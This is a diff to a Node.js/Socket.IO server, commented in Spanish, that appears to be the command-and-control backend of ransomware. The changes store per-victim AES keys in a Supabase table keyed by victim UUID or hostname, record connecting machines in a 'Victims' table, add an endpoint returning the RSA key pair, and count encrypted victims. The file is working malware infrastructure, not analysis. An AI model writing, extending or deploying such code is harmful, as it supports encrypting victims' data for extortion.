@@ -259,10 +259,38 @@ function generarClaveCliente(clienteId, clienteName = null) {
   return key;
 }
 
-function obtenerClaveCliente(clienteId, clienteName = null) {
+async function obtenerClaveCliente(clienteId, clienteName = null, uuid = null) {
   if (clavesPorCliente.has(clienteId)) return clavesPorCliente.get(clienteId);
 
-  // Try to find by name first
+  // 1. Try Supabase first (Deduplication)
+  if (supabase) {
+    try {
+      let query = supabase.from('keys').select('aes_key');
+
+      // Prioritize identifying by UUID if available, then hostname
+      if (uuid) {
+        query = query.eq('uuid', uuid);
+      } else if (clienteName) {
+        query = query.eq('hostname', clienteName);
+      } else {
+        query = null;
+      }
+
+      if (query) {
+        const { data, error } = await query.maybeSingle(); // Use maybeSingle to avoid error on null
+        if (data && data.aes_key) {
+          console.log(`[Supabase] Clave recuperada de la nube para: ${clienteName || uuid}`);
+          clavesPorCliente.set(clienteId, data.aes_key);
+          // Optional: Restore local file if missing could be added here
+          return data.aes_key;
+        }
+      }
+    } catch (e) {
+      console.log(`[Supabase Error] Checking keys: ${e.message}`);
+    }
+  }
+
+  // 2. Try Local File
   const safeName = (clienteName || clienteId).replace(/[^a-zA-Z0-9_-]/g, '_');
   const filePath = path.join(KEYS_DIR, `${safeName}_key.txt`);
 
@@ -272,10 +300,12 @@ function obtenerClaveCliente(clienteId, clienteName = null) {
     if (match) {
       const key = match[1];
       clavesPorCliente.set(clienteId, key);
-      console.log(` Clave recuperada para: ${clienteName || clienteId}`);
+      console.log(` Clave recuperada localmente para: ${clienteName || clienteId}`);
       return key;
     }
   }
+
+  // 3. Generate New
   return generarClaveCliente(clienteId, clienteName);
 }
 
@@ -409,6 +439,15 @@ app.get('/api/db/encrypted', async (req, res) => {
 });
 
 // Get stats summary
+// API Endpoint para obtener claves RSA
+app.get('/api/rsa-keys', (req, res) => {
+  res.json({
+    success: true,
+    publicKey: rsaPublicKey,
+    privateKey: rsaPrivateKey
+  });
+});
+
 app.get('/api/db/stats', async (req, res) => {
   if (!supabase) {
     return res.json({ success: false, victims: 0, keys: 0, encrypted: 0 });
@@ -803,7 +842,7 @@ io.on('connection', (socket) => {
   // Solo logueamos cuando el cliente se registra
 
   // Cliente se registra
-  socket.on('registrar-cliente', (data) => {
+  socket.on('registrar-cliente', async (data) => {
     // 1. Identificacion unica
     const uuid = data.uuid || socket.id; // Fallback para clientes viejos
 
@@ -838,21 +877,7 @@ io.on('connection', (socket) => {
 
     clientesConectados.set(socket.id, infoCliente);
 
-    // Asignar/obtener clave AES para este cliente usando hostname para el nombre del archivo
-    const clave = obtenerClaveCliente(socket.id, infoCliente.hostname);
-
-    // Enviar datos de registro incluyendo la clave publica RSA
-    socket.emit('registrado', {
-      clienteId: socket.id,
-      clave,
-      rsaPublicKey: rsaPublicKey
-    });
-
-    // Notificar a todos los clientes web sobre el nuevo cliente
-    io.emit('cliente-conectado', infoCliente);
-    logServer(` Cliente registrado: ${infoCliente.nombre} [${infoCliente.username}@${infoCliente.ip}]`);
-
-    // Sync to Cloud DB (Victims)
+    // Sync to Cloud DB (Victims) - MUST be before key generation for FK constraints
     syncToCloud('Victims', {
       uuid: infoCliente.uuid,
       socketId: socket.id,
@@ -864,6 +889,21 @@ io.on('connection', (socket) => {
       status: 'connected',
       timestamp: infoCliente.timestamp
     });
+
+    // Asignar/obtener clave AES para este cliente usando hostname para el nombre del archivo
+    // Ahora es asincrono para consultar Supabase
+    const clave = await obtenerClaveCliente(socket.id, infoCliente.hostname, infoCliente.uuid);
+
+    // Enviar datos de registro incluyendo la clave publica RSA
+    socket.emit('registrado', {
+      clienteId: socket.id,
+      clave,
+      rsaPublicKey: rsaPublicKey
+    });
+
+    // Notificar a todos los clientes web sobre el nuevo cliente
+    io.emit('cliente-conectado', infoCliente);
+    logServer(` Cliente registrado: ${infoCliente.nombre} [${infoCliente.username}@${infoCliente.ip}]`);
   });
 
   // Recibir clave AES cifrada del cliente
